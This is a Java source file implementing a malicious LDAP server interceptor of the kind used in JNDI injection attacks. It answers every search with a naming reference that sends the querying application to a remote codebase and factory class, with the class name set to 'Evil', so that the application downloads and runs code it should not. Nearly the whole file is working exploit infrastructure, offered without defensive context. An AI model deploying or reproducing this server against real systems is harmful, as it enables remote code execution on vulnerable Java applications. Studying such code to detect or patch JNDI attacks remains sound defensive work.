import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

import java.net.MalformedURLException;
import java.net.URL;

class OperationInterceptor extends InMemoryOperationInterceptor {

    private final URL codebase;

    public OperationInterceptor(URL cb) {
        this.codebase = cb;
    }

    @Override
    public void processSearchResult(InMemoryInterceptedSearchResult result) {
        String base = result.getRequest().getBaseDN();
        Entry entry = new Entry(base);

        try {
            sendResult(result, base, entry);
        } catch (LDAPException | MalformedURLException e) {
            e.printStackTrace();
        }
    }

    protected void sendResult(InMemoryInterceptedSearchResult result, String base, Entry entry)
            throws LDAPException, MalformedURLException {
        URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(".class"));
        System.out.println("Send LDAP reference result for " + base + " redirecting to " + turl);
        entry.addAttribute("javaClassName", "Evil");
        String cbstring = this.codebase.toString();

        int refPos = cbstring.indexOf('#');
        if (refPos > 0) {
            cbstring = cbstring.substring(0, refPos);
        }

        System.out.println(cbstring);
        System.out.println(this.codebase.getRef());
        entry.addAttribute("javaCodeBase", cbstring);
        entry.addAttribute("objectClass", "javaNamingReference"); //$NON-NLS-1$
        entry.addAttribute("javaFactory", this.codebase.getRef());
        result.sendSearchEntry(entry);
        result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
    }
}